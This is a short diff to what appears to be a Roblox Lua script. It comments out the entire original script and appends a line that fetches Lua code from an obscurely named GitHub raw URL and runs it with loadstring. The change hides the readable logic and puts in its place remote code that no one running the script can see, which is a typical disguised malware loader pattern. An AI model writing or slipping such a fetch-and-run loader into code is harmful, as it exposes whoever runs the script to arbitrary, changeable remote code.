@@ -1,3 +1,5 @@
+--[[
+
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -647,3 +649,8 @@ spawn(function()
 		end
 	end
 end)
+
+
+]]
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/78637bcawubsg76c73/keyfinished.lua'))()
